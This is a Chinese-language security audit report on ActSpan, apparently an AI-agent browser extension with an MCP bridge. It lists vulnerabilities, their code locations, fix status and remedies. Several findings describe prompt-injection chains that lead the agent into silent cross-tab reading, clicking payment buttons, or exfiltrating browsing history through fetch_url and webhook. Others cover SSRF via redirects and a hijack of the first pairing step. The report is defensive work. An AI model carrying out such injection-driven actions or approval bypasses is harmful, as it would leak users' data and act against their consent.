# ActSpan 代码审计问题清单

> 审计范围：`src/`（扩展）、`mcp-server/`、`public/manifest.json`。
> 审计方式：只读静态阅读；本报告的编写未修改仓库代码。审计期间工作区出现了并发修复（非本报告所为），状态见下方版本说明。
> 严重度为我基于“可利用性 × 影响面 × 触发概率”的主观分级；每条都给出可直接定位的代码位置与修复建议。

## 摘要

共 39 项主问题（P0 7 项、P1 32 项）与 46 项加固建议；第 7 轮补充 2 项 P2，第 8 轮补充 1 项 P1 与 2 项 P2，第 9 轮补充 3 项 P2，第 10 轮补充 1 项 P1 与 2 项 P2，第 11 轮补充 1 项 P1 与 2 项 P2，第 12 轮补充 3 项 P2，第 13 轮补充 2 项 P1 与 1 项 P2，第 14 轮补充 1 项 P1 与 1 项 P2，第 15 轮补充 1 项 P2，第 20 轮补充 1 项 P2，第 21 轮补充 1 项 P2，第 22 轮补充 1 项 P2，第 23 轮补充 1 项 P2，第 29 轮补充 1 项 P2（已修复），第 30 轮补充 1 项 P1 与 2 项 P2，第 31 轮补充 2 项 P1 与 1 项 P2，第 32 轮补充 3 项 P2，第 33 轮补充 1 项 P1 与 2 项 P2，第 34 轮补充 2 项 P1 与 1 项 P2，第 35 轮补充 2 项 P1 与 1 项 P2（见第 29–39 条、P2 第 29–46 条）。

> 版本说明：本报告最初基于提交 `f897245` 编写。审计期间工作区持续出现未提交的修复（截至 2026-10-22 00:08 的观察）：第 1、2、5、9、10、11、12、13、14、15、16、17、18、19、20、22、23、24、25、26、29、31、34 条已修复，第 3、4、6、7、8、21、30、32 条部分修复；P2 第 19、24、30、31、33、34、35、37、38、39、40、41、42 条已修复或部分修复；第 33、35 条与 P2 第 43、44 条已修复（第 34 轮）；第 36、37、38、39 条与 P2 第 45、46 条未修复。相关单测已补（见各条“状态”与 `audit-rounds.md`）。其余条目仍按当前工作区代码核对；若评审时这些修复尚未合入，请以 `f897245` 为准。

建议优先处理（不含已修复项）：

1. 第 4 条剩余部分：白名单内的 `cdp_input`/`screenshot`/`tab_navigate` 仍由 `runner.execute` 直接执行，不经 `policyExecutor`/租约；`__debug_run_plan` 与常驻任务的直接 plan 调用也不经技能审批。
2. 第 24 条已修复（第 28 轮确认）：动态工具 endpoint 已加 SSRF/重定向校验与响应/清单上限；原剩余项关闭。
3. 第 7 条剩余部分：二进制重定向已阻止回传，但请求已发出，仍有盲 SSRF。
4. 第 3、6、8 条剩余部分：`screenshot(url)`/同标签页未持租约读取、TOFU 首配、无身份调用的信任作用域。
5. 第 21 条残余：`pruneTerminalTasks` 已释放租约，但删除任务后 `closeOwnedTabs` 立即返回，已打开标签页仍不会关闭。
6. 第 7 轮新增 P2：usage 账本并发读改写会丢计数且写入失败被忽略；冷启动 clientId 的读-生成-写-再读存在竞态。
7. 第 8 轮新增 P1：开放 Shadow DOM 把审批/提问/录制控件暴露给页面脚本，可自动批准敏感操作（第 34 轮已改为 closed shadow + isTrusted，复核通过）。
8. 第 8 轮新增 P2：`ask_user` 向所有标签页广播且响应不校验来源；AI 流事件广播导致 content 侧跨会话绑定。
9. 第 9 轮新增 P2：会话 ID 同毫秒碰撞；录制步骤/截图队列无上限；录制 URL 未脱敏即发送给 LLM。
10. 第 10 轮新增 P1：常驻 AI 未禁用统一 `agent`，且无 `toolContext` 时跳过租约，子代理可跨标签页操作（第 27 条）；同轮 P2 为阶段交接外发全部标签页 URL、取消后残缺工具配对（P2 第 22–23 条）。
11. 第 11 轮新增 P1：SSRF 守卫只做字面量判断，通配 DNS（`*.nip.io`/`localtest.me` 等）可解析到内网（第 28 条）；同轮 P2 为日志缓冲区并发丢失更新、二进制传输缓存无总量上限（P2 第 24–25 条）。
12. 第 12 轮新增 P2：发布工作流无测试门禁且持有写权限/可变 action 标签；锁文件固定第三方 npm 镜像；manifest 缺 `minimum_chrome_version`（P2 第 26–28 条）。
13. 第 13 轮新增 P1：`bookmark_ops` 的写入动作与全量导出被标成 `read`，可静默篡改/导出收藏（第 29 条）；`download_file` 以 `interact` 静默执行、缺少 SSRF 校验且可写任意文本文件（第 30 条）；同轮 P2 为 `clipboard_ops` 的 `write` 无确认（P2 第 29 条）。
14. 第 14 轮新增 P1：`timer` 的 list/update/clear 不校验任务归属，跨会话可取消/篡改定时任务且全程无审批（第 31 条）；同轮 P2 为 `TimerStore` 并发读改写丢任务/复活已取消任务（P2 第 30 条）。
15. 第 15 轮新增 P2：`site_experience` 的 `save` 可跨域写入并整体覆盖本地经验，后续 `choose` 可被塑形到指定选择器（P2 第 31 条）。
16. 第 20 轮新增 P2：任务失败/取消时 `withNewTabs` 不关闭已创建的新标签页，且 `closeOwnedTabs` 无法补偿（P2 第 32 条）。
17. 第 21 轮新增 P2：5 秒空闲 detach 未考虑控制台/Fetch 监听，启动后约 5 秒静默失效（P2 第 33 条）。
18. 第 22 轮新增 P2：`elementHandleMap` 有 4000 上限，但 `elementHandleSnapshotMap` 未同步清理/限制，超大 DOM 长会话可持续增长（P2 第 34 条）。
19. 第 23 轮新增 P2：`session.eventLog` 在内存中无上限，持久化截断只作用于快照副本，长会话会持续增长（P2 第 35 条）。
20. 第 30 轮新增 P1（主体已修复，保留残余）：`tab_navigate(open)` 已提升 `sensitive`、校验初始 URL、纳入始终确认并移出审查白名单；残余仅 302 未复检最终地址（第 32 条）。
21. 第 30 轮新增 P2 已修复（第 31/32 轮）：阶段交接已共享墙钟与工具预算，达到阶段上限显式失败（P2 第 37 条）。
22. 第 30 轮复核：第 29、31、38 条已补齐（`search/recent/list`、旧定时器/常驻无身份路径、无身份信任重置均关闭）；第 30 条仍保留 URL 下载 302 盲 SSRF 残余，第 32 条保留 open 的 302 残余。
23. 第 31 轮审计新增 P1（第 34 轮已修复）：`cdp_frame.snapshot` 以 `interact` 递归调用 `evaluate`，读取跨域 iframe 文本不弹审批（第 33 条）。
24. 第 31 轮审计新增 P1（第 32 轮已修复）：`cdp_network.get_body` 已提升为 `sensitive`，文本响应返回前做结构化/文本脱敏（第 34 条）。
25. 第 31 轮新增 P2（第 34 轮结束观测已修复）：`data_pipeline` 的 `export` 现为 `sensitive` 并要求审批，文件名复用 `sanitizeFilename` 且限制扩展名（P2 第 39 条）。
26. 第 32 轮新增 P2（第 34 轮结束观测已修复）：网络监听增加到期定时器，空闲监听也会在 30 分钟停止（P2 第 40 条）。
27. 第 32 轮新增 P2（第 34 轮结束观测已修复）：`site_experience` 的本机层读改写已串行化，草稿写入并入同一队列（P2 第 41 条）。
28. 第 32 轮新增 P2（第 34 轮结束观测已修复）：`MAX_SESSIONS` 在全部会话运行时会拒绝新会话，不再无限增长（P2 第 42 条）。
29. 第 33 轮审计新增 P1（第 34 轮已修复）：`page_skeleton` 把密码/隐藏字段等输入值写入骨架属性，`page_snapshot` 对非密码敏感字段也不脱敏，均为 `read` 直接进模型（第 35 条）。
30. 第 33 轮审计新增 P2（第 34 轮已修复）：页面脚本可派发 `actspan-escape` 触发 `__session_clear`，中止当前任务/清空会话（P2 第 43 条）。
31. 第 33 轮审计新增 P2（第 34 轮已修复）：录制遮罩的完成/取消按钮在页面 DOM 中且未校验 `isTrusted`，页面可合成点击停止或丢弃录制（P2 第 44 条）。
32. 第 34 轮审计新增 P1：MCP `tab.open`/`tab.navigate` 只做协议白名单，未拦截本机/内网，也未复检 302 最终地址；审批文案不含 URL（第 36 条）。
33. 第 34 轮审计新增 P1：`page.snapshot` 以 `read` 枚举所有 frame，无审批读取跨源 iframe 的文本/标签，绕过第 33 条对 `cdp_frame.snapshot` 的修复（第 37 条）。
34. 第 34 轮审计新增 P2：Service Worker 启动时在恢复完成前已开始处理消息，恢复逻辑会 `clear()` 掉期间新建的会话/任务/租约（P2 第 45 条）。
35. 第 35 轮审计新增 P1：MCP `data.fetch`/`data.paginate` 以 `read` 注册、`data.download` 以 `interact` 注册，绕过 `fetch_url`/`download_file` 的 `sensitive` 声明与审批（第 38 条）。
36. 第 35 轮审计新增 P1：`paginate` 不做 SSRF/凭据 URL 前置校验，`fetch(...credentials:'include')` 默认跟随重定向，凭据页在响应后才拒绝（第 39 条）。
37. 第 35 轮审计新增 P2：`ArtifactStore.getScreenshot` 命中内存缓存后不再检查 24 小时过期，长驻 Service Worker 可继续读取/下载已过期截图（P2 第 46 条）。

---

## 一、P0：高危

### 1. [已修复] `getTextContent` 只识别 `input_text`，助手回复与子代理结果会“凭空消失”

**状态**
工作区已修复（未提交）：`getTextContent`/`stripImagesFromContent`/`estimateContextTokens` 已接受 `output_text`，`chatStream` 结束时补写 assistant message；`src/ai/context-manager.test.mjs`、`src/ai/llm-client.test.mjs` 通过。以下保留基线分析与修复建议。

**位置**
- `src/ai/context-manager.ts:20-28`（工作区版本）
- `src/ai/core-loop.ts:518-520`、`src/ai/core-loop.ts:844-858`
- `src/ai/tool-executor.ts:429-438`
- `src/background/session-manager.ts:956-966`
- `src/ai/phase-orchestrator.ts:105-114`、`src/ai/review-agent.ts:90-100`
- `src/background/session-context-tasks.ts:281-301`、`:543-552`

**问题（基线 `f897245`）**
基线版本中，Responses API 返回的助手消息是 `{ type: 'message', role: 'assistant', content: [{ type: 'output_text', text }] }`（见 `src/ai/types.ts:51-60`，测试夹具 `src/ai/core-loop.test.mjs:142` 也是这个形状）。`collectStreamResponse` 把这些 item 原样 `context.push(item)`；但 `getTextContent` 只过滤 `part.type === 'input_text'`，对 `output_text` 返回空字符串。更糟的是基线版本的 Chat Completions 模式（`src/ai/llm-client.ts` 的 `chatStream`）只把 `delta` 累积进 `fullText`，永远不会把最终文本写进 `context`，`outputItems` 里只有 `function_call`。

**影响**
- `extractLastAssistantReply` 永远拿不到子代理的最终回答，父代理只收到 `Agent 已完成但无明确输出`（`src/ai/core-loop.ts:624`）。
- 轮数耗尽分支 `hasReply` 恒为 false，会多发一次“总结”请求，造成重复回答与额外费用（`src/ai/core-loop.ts:845-858`）。
- 审查代理/阶段编排对“最近助手文本”的提取、上下文压缩中的助手消息都会拿到空文本；飞书的正常路径使用 eventLog 里的 `lastAgentMessage`（`session-manager.ts:1064-1068`），但一旦走到 `extractLatestAssistantMessageFromContext` 兜底也会为空。
- 现有测试用例本身就使用了 `output_text`（`src/ai/core-loop.test.mjs:142`），但没有覆盖 `getTextContent`，所以问题被漏掉。

**建议**
- `getTextContent` 同时接受 `input_text` 与 `output_text`；或在写入上下文时统一规范化为纯字符串。
- Chat Completions 模式在流结束时把 `fullText` 作为 `{role:'assistant', content: fullText}` 写入 `context`，与 Responses 模式对齐。
- 补一条单测：`getTextContent([{type:'output_text', text:'hi'}]) === 'hi'`，并覆盖子代理返回路径与两种协议模式。
- 顺手把 `stripImagesFromContent`、`isSessionCompressionMessage` 等基于 `input_text` 的判断一并统一。

---

### 2. [已修复] 工作流录制器把密码/银行卡/验证码等输入值发给第三方 LLM 并持久化

**状态**
工作区已修复（未提交）：新增 `src/lib/recorder-redaction.ts`，content 侧按 `inputType`/`autocomplete` 识别，background 侧按 selector/语义提示兜底脱敏；`src/lib/recorder-redaction.test.mjs` 通过。以下保留基线分析与建议。

**位置**
- `src/content/float-ball/hooks/useRecorder.ts:79-101`、`:139-160`（工作区版本）
- `src/background/workflow-recorder.ts:232-255`、`:309-318`（工作区版本）
- `src/lib/recorder-redaction.ts`（修复新增）

**问题（基线 `f897245`）**
基线版本的录制逻辑只排除了 `#actspan-root` 与录制遮罩，没有判断 `input[type="password"]`、`autocomplete="cc-number" / "one-time-code"`、`name/id` 是否命中密码/卡号/验证码语义。输入框内容经过 800ms 防抖后以明文进入 `RecorderStep.value`，随后：
1. 写入 `recorderState.steps`（session storage）；
2. 逐字拼进审计提示词交给 `chatComplete`（即用户的 LLM 服务商）；
3. AI 生成的工作流如果保留了字面值，还会随 `save-workflow` 长期保存。

**影响**
- 用户录制一次“登录/支付/改密”流程，明文密码、卡号、验证码可能泄露给模型服务商并长期留在扩展存储中。
- 与产品在 `page-grounding` 中对密码值做隐藏（`[已填写密码，值已隐藏]`）的努力不一致。

**建议**
- 录制侧对 `type=password`、`autocomplete` 敏感值、以及命中 `password|passwd|otp|code|card|cvc|cvv|secret|token` 的字段直接跳过记录，或只记录“已填写（值已隐藏）”。
- 背景侧在发给 LLM 前做一次强制脱敏（不要信任内容脚本）。
- 保存工作流前对 `value` 做策略校验：默认不持久化字面值，改为占位符/变量。

---

### 3. [已修复（第 36 轮）] 跨标签页读取/截图/点击缺少租约约束，且可被会话级 trustAll 静默放行

**状态**
工作区已修复“完全免确认”的部分：`resolvePermissionLevel` 对“显式 `tab_id` 与当前任务标签页不一致”的 `read`/`interact` 提升为 `sensitive`，审批文案也会点名目标（`src/ai/tool-executor.ts:153-216`）；`executeSingleTool` 对显式目标调用 `tabLeaseManager.authorize`，同标签页但只要存在他人租约也会校验，找不到任务或没有任务身份时直接拒绝（`src/ai/tool-executor.ts:279-304`），`isAlwaysConfirmOperation` 已把跨标签页纳入始终确认；`screenshot` 的 `url` 路径已限制为可公开访问的 http/https 并需要任务租约，截图前还会复检最终地址，302 到内网/`file://` 会被拒绝（`src/functions/screenshot.ts:175-205`）。第 36 轮已补齐：`cdp_input` 在 click/double_click/right_click/click_text/fill 执行前通过 `__page_grounding_action` 的 `classify` 动作在真实元素上调用 `classifySensitiveTarget`；命中 payment/deletion 时强制单独确认，且该确认不经过 trustAll（第 5 条已另行处理支付/删除签名）。

**位置**
- `src/ai/tool-executor.ts:153-203`（跨标签页提升 + 目标标签页提示）
- `src/functions/page-viewer.ts:53-58`（`tab_id` 优先，直接读任意标签页，无租约校验）
- `src/functions/page-snapshot.ts` + `src/functions/page.ts:171-180`（同样透传 `tab_id`，无租约校验）
- `src/functions/screenshot.ts:51`（`permissionLevel: 'read'`），`tab_id`/`url` 在 `:119`、`:167-168` 直接使用；`url` 会新开任意页面并截图（`:64-67`）
- `src/functions/cdp-input.ts:1009-1020`、`:1249-1264`（`permissionLevel: 'interact'`，`tab_id` 优先，无租约校验）
- `src/functions/tab-navigate.ts:36-48`（工作区已把 `list` 提升为 `sensitive`）

**问题**
MCP 桥接层有一套完整的租约与支付审批（`policy-executor.ts`、`mcp-bridge.ts:647-670`），但扩展自身的 AI 工具**不经过 `policyExecutor`**；`tool-executor` 只对 `sensitive/dangerous` 弹确认。工作区版本虽把跨标签页访问提升为 `sensitive`，但：
1. `page_viewer`/`page_snapshot`/`screenshot`/`cdp_input` 仍不检查 `tabLeaseManager`；
2. `resolveSensitiveApproval` 在信任作用域命中时直接放行，而 `isAlwaysConfirmOperation` 只覆盖 `dangerous`（`src/ai/tool-executor.ts:216-233`），跨标签页的 `sensitive` 不在其中；
3. `cdp_input` 的 click/fill 不经过 `classifySensitiveTarget`，支付按钮与普通按钮同等对待。

**影响**
页面内容会进入模型上下文。一个包含提示注入的网页可以：诱导用户在一次跨标签页读取时选择“本次不再询问” → 之后静默读取/截图任意标签页，或通过 `cdp_input(tab_id=...)` 对任意标签页点击/填写（包括支付/删除按钮）。

**建议**
- 在 `page_viewer`/`page_snapshot`/`screenshot`/`cdp_input` 中复用 `ownedContext` + `authorize`，拒绝访问会话租约之外的标签页。
- 把跨标签页访问加入 `alwaysConfirm`（不受 `trustAll` 影响）。
- 对 `cdp_input` 的 click/fill 复用 `classifySensitiveTarget`，支付/删除目标始终确认。

---

### 4. [部分修复] 远端/导入技能计划：白名单已收紧，但允许的动作仍不经审批/租约

**状态**
工作区已修复“任意内置动作”的部分：`validateRemotePlan`/`normalizeRemotePlan` 改用 `resolveWorkflowPlanAction`，并校验子动作（包括模板展开后的运行时复查），`tab_navigate` 也不再允许 `close/move`；`src/functions/debug-tab-isolation.test.mjs` 新增对应用例。`skill(action="run")` 在执行前会解析旧别名并汇总写操作，要求用户一次性批准（`src/functions/skill.ts:296-338`）；`runRemotePlan` 把每一步的 `tab_id` 强制钉回上下文标签页（`src/functions/remote-workflow.ts:537-545`），并在入口拒绝已被其他任务租用的标签页（`:452-462`），调试页/常驻任务也不能借 plan 抢占租约。第 36 轮进一步收紧：`runRemotePlan` 在每一步执行前复查目标标签页租约（覆盖 `open/switch` 后的目标变化），`cdp_input` 的敏感目标确认已进入 `runner.execute` 路径。剩余：`cdp_frame evaluate`、`screenshot`、`tab_navigate navigate/open` 仍由 `runner.execute` 直接执行，不经 `policyExecutor`；调试页/常驻任务的直接 plan 调用不经过技能审批。

**位置**
- `src/functions/remote-workflow.ts:317-354`（`validateRemotePlan` 动作/子动作白名单）
- `src/functions/remote-workflow.ts:356-380`（`normalizeRemotePlan` 同样校验）
- `src/functions/remote-workflow.ts:509-515`（模板展开后的运行时子动作复查）
- `src/functions/remote-workflow.ts:532-535`（`runner.execute` 直接执行）
- `src/functions/skill.ts:296-309`（`skill(action="run")` → `executeDebugRemotePlan`，`skill` 为 `interact`）
- `src/functions/resident-runtime.ts:235-249`（常驻任务同样直接执行）
- `src/background/workflow-handlers.ts:205-234`（`__debug_run_plan` 接受任意 plan）
- `src/functions/registry-service.ts:73-103`（远端 skill 的 `plan` 原样克隆；导入侧仍无独立校验）

**问题**
白名单现在能挡住 `cdp_dom(set_html)`、`tab_navigate(close)` 这类动作，但白名单**本身**包含 `cdp_input` 的 `click/click_text/fill/key_press`、`cdp_frame` 的 `evaluate`、`screenshot` 和 `tab_navigate` 的 `open/navigate`。这些步骤执行时直接调用 `runner.execute`，不走 `policyExecutor`，也不获取标签页租约；`skill` 的 `tab_id` 参数还会覆盖 `effectiveContext.tabId`（`skill.ts:298-303`）。因此一个恶意远端技能仍可对任意标签页点击、填写、截图，或读取页面上下文。

**影响**
供应链式的权限提升仍然存在，只是从“任意内置工具”收窄为“白名单内的点击/填表/evaluate”。例如恶意 manifest 可以携带 `cdp_input(click_text="立即支付")`，在用户没有逐动作确认、也没有租约限制的情况下执行。

**建议**
- 白名单只负责“动作存在性”，执行前仍需经过 `policyExecutor`（或至少 `tool-executor` 的权限/确认逻辑），并传入正确的 `taskId/sessionId/tabId` 以走租约。
- 对 `cdp_input` 的点击/填表复用 `classifySensitiveTarget`，支付/删除目标必须单独确认。
- 远端技能导入时对 `plan` 做与 `save-workflow` 相同的校验，失败则拒绝导入。

---

### 5. [已修复] 支付/删除动作的“审批后签名复核”仍有绕过路径

**状态**
静态确认已修复：`real:true` 路径派发前重新 `inspectAction` 并比对签名（`src/background/mcp-bridge.ts:1111-1121`）；合成路径的 `approvalError` 在没有 `approved_signature` 时，对 `payment`/`deletion` 目标 fail-closed（`src/content/page-grounding.ts:1258-1268`）。建议在真实 Chrome 中回归一次“审批期间把普通按钮改成支付按钮”的事件通道。以下保留基线分析。

**位置**
- `src/background/mcp-bridge.ts:1068-1077`（`real:true` 重判，已修复）
- `src/background/mcp-bridge.ts:644-670`（只有初始分类为 `payment` 才写入 `approvedPaymentActions`）
- `src/content/page-grounding.ts:1248-1252`（`approvalError` 在没有 `approved_signature` 时直接返回 `null`）
- `src/content/page-grounding.ts:1295`、`:1313`（合成 click/type 走 `approvalError`）

**问题**
桥接层在 `inspectAction` 时给目标算签名，审批通过后把签名放进 WeakMap；但：
1. **初始分类为普通、执行时变成支付**：若 inspect 时目标是普通按钮，则不会写入签名；等待审批期间页面把按钮文案改成“立即支付”，点击时 `approved_signature` 为 `undefined`，`approvalError` 返回 `null`，动作照常执行。用户看到的审批文案里也不含目标标签。
2. （已修复）`real:true` 直接 `replayReal()` 不校验签名。

**影响**
用户批准的是“点击这个普通按钮”，实际执行的却可能是坐标处新出现的支付/删除按钮。这正是签名机制想防的 TOCTOU。

**建议**
- 无论初始分类如何，都把 inspect 的签名带入执行，并在执行前强制重算比较；普通动作也应检测“变成 payment/deletion”。
- `approvalError` 在缺少签名时应默认拒绝（fail-closed），而不是放行。
- 审批文案中加入目标标签/金额，避免用户“盲批”。

---

### 6. [部分修复] 本地配对接口的 TOFU 首配窗口仍可被抢占

**状态**
工作区已大幅收紧：首次 `pair` 由 bridge 签发 32 字节 `pairingSecret`，只把 SHA-256 写入 0600 元数据；之后所有 `pair` 必须带回 secret（`timingSafeEqual` 比较），owner probe 也必须持有 0600 元数据里的 nonce（`mcp-server/bridge.js:246-273`、`:280-294`、`:358-379`）。扩展侧已持久化 secret（`src/offscreen/mcp-transport.ts:226-250`、`:280-296`）。剩余风险：首次配对仍是 TOFU，本地进程若在扩展之前抢先 `pair`，仍可拿到 token 与 secret；同用户进程可读 0600 元数据，仍能通过 owner probe 获知扩展 ID/端口/在线状态。

**位置**
- `mcp-server/bridge.js:246-273`（`hashPairSecret`/`verifyPairSecret`/`loadPairSecretHash`）
- `mcp-server/bridge.js:280-294`（owner probe 要求 0600 nonce）
- `mcp-server/bridge.js:358-379`（`pair` 首次签发 secret，之后强制校验）
- `src/offscreen/mcp-transport.ts:226-250`、`:280-296`（扩展侧保存并回传 secret）

**问题**
`allowPair(origin)` 仍只检查 WebSocket 握手头里的 `Origin` 是否等于已登记的 `chrome-extension://<id>`；Origin 可伪造。修复后的配对流程依赖“第一次由谁完成配对”：在首次启动、元数据里还没有 `pairSecretHash` 时，任何本地进程只要伪造 Origin 并先发 `{type:'pair'}`，就能获得 token 和 `pairingSecret`，之后合法扩展反而会被要求提供该 secret。owner probe 的 nonce 虽然写在 0600 文件里，但同一用户下的进程可以读取。

**影响**
- 首次配对的 TOFU 窗口内，本地恶意程序仍可抢先获得 bridge token，冒充 extension 或客户端。
- 同用户进程仍可探测扩展 ID、端口与连接状态，为钓鱼/伪装提供信息。
- 修复前“任意时刻都能配对”的问题已解决；现在只有首配窗口 + 元数据可读的残余风险。

**建议**
- 用用户可见的一次性配对码（扩展 UI 显示、用户输入到客户端）替代 TOFU，或把 `pair` 的首次响应改为需要用户在扩展侧确认。
- 元数据文件只保存 hash 已经很好；owner probe 也应要求一个短期、仅内存的 nonce，而不是磁盘上的长期 nonce。
- 对 `pair` 失败做速率限制与审计；不要向未认证连接暴露扩展 ID/端口。

---

### 7. [已修复] 提示注入 → 数据外泄链（history / fetch_url / webhook）

**状态**
工作区已把 `history_search`、`fetch_url`、`webhook` 都提升为 `sensitive`，`fetch_url` 还增加了字面量私有/本地地址拦截（`src/functions/fetch-url.ts:9-40`、`:119`；`history-search.ts:13`；`webhook.ts:277`），文本路径在隐藏标签页加载完成后复检最终地址，二进制路径同样校验 `result.url`（`fetch-url.ts:25-60`、`:119-124`）；`fetchPublicHtml` 遇到无法逐跳校验的 `opaqueredirect` 直接失败。`fetch_url`/`webhook`/`history_search` 已加入 always-confirm 集合，不能被“本轮内不再询问”放行（`src/ai/tool-executor.ts:218-224`）。

**位置**
- `src/functions/history-search.ts:13`（已为 `sensitive`，返回完整 URL/标题）
- `src/functions/fetch-url.ts:9-40`、`:119`、`:130`（私有网段拦截 + `sensitive`）
- `src/functions/webhook.ts:277`（已为 `sensitive`）
- `src/functions/tab-navigate.ts:218-231`（`list` 已为 `sensitive`）
- `src/ai/tool-executor.ts:184-187`（`read`/`interact` 仍不弹确认，但上述工具已不在其中）

**问题**
修复前模型可以自主调用上述工具且不需要用户确认；工作区把 `history_search`/`fetch_url`/`webhook`/`tab_navigate.list` 都提升为 `sensitive` 后，这条链路需要用户逐次批准。仍有两点可被绕开：
1. `isBlockedFetchUrl` 只检查初始 URL，`fetch` 默认跟随重定向；攻击者可用公网 URL 302 到 `http://127.0.0.1:...` 或内网地址。
2. 会话级信任（`sensitiveTrustScopes`，第 8 条）：用户一次“本次不再询问”后，同一会话的后续外发不再弹确认。

**影响**
- 恶意网页需要诱导用户批准一次，之后仍可能经 `trustAll` 静默读取历史并外带到攻击者服务器。
- `webhook` 可能把数据写到用户不期望的位置（例如公开的群机器人）。

**建议**
- `fetch_url` 在重定向后再次校验最终 URL，并设置 `redirect: 'manual'` 或逐跳校验；同时拦截 IPv4-mapped/十进制等变体。
- 把“带用户数据的出站网络请求”做成独立的、不可被 `trustAll` 跳过的确认类别。
- 对 `history_search` 的返回做用途限制或脱敏；`tab_navigate.list` 已提升为 `sensitive`，可保留。

**状态**：两点绕过均已关闭。`fetch_url` 文本路径加载完成后复检最终 URL，二进制路径校验 `result.url`，`fetchPublicHtml` 对 `opaqueredirect`/status 0 直接失败；`history_search`/`fetch_url`/`webhook` 加入 `OUTBOUND_RISK_TOOLS`，每次调用都重新确认，不受“本轮内不再询问”影响（`src/ai/tool-executor.ts:218-228`）。

---

## 二、P1：中高危

### 8. [已修复] 敏感信任已按会话隔离，但无身份调用仍共享 `global` 作用域

**状态**
工作区已把模块级布尔值改为按 `sessionId`/`taskId` 隔离的 `Set`（`src/ai/tool-executor.ts:134-148`、`:233`），`orchestrator` 每轮只重置本会话（`src/ai/orchestrator.ts:51-52`），子代理显式继承父级 `toolContext`（`src/ai/core-loop.ts:616-621`）。无身份调用的兜底作用域已从 `'global'` 改为空字符串，`resolveSensitiveApproval` 只在作用域非空时复用信任，因此定时器/常驻任务每次都会确认；会话清除与取消时也会删除对应信任（`src/background/session-channel-handlers.ts:372-424`）。审批文案改为“本轮内不再询问”，与实际生命周期一致。

**位置**
- `src/ai/tool-executor.ts:134-148`（`sensitiveTrustScopes` + `resolveTrustScope`）
- `src/ai/tool-executor.ts:233`（命中作用域直接放行）
- `src/ai/orchestrator.ts:51-52`（按作用域重置）
- `src/ai/core-loop.ts:616-621`（子代理继承 `toolContext`）

**问题**
修复前，用户在 A 会话点“本次不再询问”会对整个模块生效，B 会话/子代理/定时器都继承。现在按 `sessionId || taskId || 'global'` 隔离，跨会话问题已解决；但：
1. 任何未携带 `sessionId`/`taskId` 的后台调用都使用同一个 `'global'`，仍然互相影响。
2. 信任只在 `handleChat` 入口清理，不在轮次结束清理；“本次不再询问”实际是“本会话永久信任”，与文案不完全一致。

**影响**
- 正常聊天/子代理之间不再串扰。
- 定时器、常驻任务等无身份入口仍可能把一次信任带给彼此。

**建议**
- 删除 `'global'` 兜底：无身份时按“每次都必须确认”处理，或为每个定时器/常驻任务生成独立作用域。
- 在轮次/会话结束时清理该作用域；把“本次不再询问”改成明确的“本会话内不再询问”文案。

---

### 9. [已修复] `__session_clear` 不删除会话，且会被再次持久化

**状态**
工作区已修复：`handleSessionClearOp` 结束时删除 `sessions` 条目并调用 `removeSessionHistory`，不再在中止运行后 `persistSessionHistory`（`src/background/session-channel-handlers.ts:379-412`；`src/background/session-history.ts:266-283`）。

**位置**
- `src/background/session-channel-handlers.ts:379-412`
- `src/background/session-history.ts:266-283`（新增 `removeSessionHistory`）
- `src/background/session-persistence.ts:46-68`（序列化所有 `sessions`）

**问题（基线 `f897245`）**
“清除”只做 `closeAll`、中止运行、清空 `activeSessionId`、广播 `cleared`，**没有** `sessions.delete(op.sessionId)`，也没有删除该会话的持久化记录；结尾的 `persistRuntimeSessions()` 会把仍在 `sessions` 里的会话完整写回。`sessionTaskKinds` 被删了，`sessions` 却没有。

**影响**
- 被“清除”的会话在后台内存和 `chrome.storage.local` 中继续存在，重启后仍可被恢复；用户以为已删除的对话内容仍在。
- 这些“幽灵会话”占用 `MAX_SESSIONS` 名额，加速后续淘汰（见第 10 条）。

**建议**
已按上述方式实现；建议补一条“清除后重启仍不存在”的集成测试。

---

### 10. [已修复] `MAX_SESSIONS` 淘汰可能直接中止正在运行的任务

**状态**
工作区已修复：淘汰时过滤 `status !== 'running'`、`activeControllers`、`findRunningTask`，并按 `endedAt ?? createdAt` 选最久未活动的会话；没有可淘汰项时只告警、不中止（`src/background/session-manager.ts:1145-1163`）。

**位置**
- `src/background/session-manager.ts:1145-1163`
- 定时任务每次触发都新建会话：`src/background/timer-dispatch.ts:108-133`

**问题（基线 `f897245`）**
注释写“清理最早的非活跃会话”，实现却是按 `Map` 插入顺序取第一个（非当前 id），若它有 `activeControllers` 就直接 `abort()`。会话不会因为“活跃”而改变位置，所以正在运行的长任务也可能被淘汰。

**影响**
用户正在执行的长任务可能因为另一个标签页/定时器创建了第 11 个会话而被静默中止；随后 `persistRuntimeSessions` 还会把淘汰结果写盘。

**建议**
已按上述方式实现；定时任务仍每次新建会话，建议复用专用会话或计入容量策略，避免长期膨胀。

---

### 11. [已修复] 定时任务在“任意会话运行中”被静默丢弃

**状态**
工作区已修复：只有同一 `tabId` 的任务才构成冲突（无 `tabId` 时仍用全局判断）；`interval` 重排下次，`schedule` 用 `computeNextScheduleRun` 重新 alarm，`timeout` 短延迟 15s 重试（`src/background/timer-dispatch.ts:41-67`）。

**位置**
- `src/background/timer-dispatch.ts:41-67`

**问题（基线 `f897245`）**
`hasActiveSessionRun = hasRunningTasks()` 是全局判断；只要有任何会话在跑，本次触发就 `return`。跳过分支只对 `interval` 重新计算 `nextRunAt`，对 `timeout` 和 `schedule` **什么都不做**。`timeout` 的运行时定时器已经触发并被清掉，`schedule` 的一次性 alarm 也已经触发，因此它们不会再有下一次。

**影响**
- 用户设置的一次性提醒/定时任务可能因为当时恰好在和 AI 对话而永久丢失（无通知、无重试）。
- `schedule` 类任务同样丢失后续调度。

**建议**
已按上述方式实现；建议补一条“timeout 在忙时重试、schedule 在忙时重排”的测试。

---

### 12. [已修复] `page(action="assert"|"repair")` 忽略 `tab_id`

**状态**
工作区已修复：显式 `tab_id` 会覆盖 `context.tabId` 后再调用 assert/repair（`src/functions/page.ts:192-213`）。仍未修复：该路径没有租约校验（由第 3 条覆盖）。

**位置**
- `src/functions/page.ts:136`（schema 接受 `tab_id`）
- `src/functions/page.ts:192-213`（assert/repair 现在覆盖 `context.tabId`）
- `src/functions/page-assert.ts:100-103`（优先用 `context.tabId`，没有才取活动页）

**问题（基线 `f897245`）**
`view/snapshot/skeleton` 都转发 `params.tab_id`，但 `assert/repair` 没有；它们实际作用于 `context.tabId`（会话标签页）。当模型显式传入另一个标签页的 `tab_id` 时，断言/修复会在错误的页面上执行。

**影响**
- 多标签页任务中会得到“断言通过/失败”的错误结论，或修复了错误的页面。
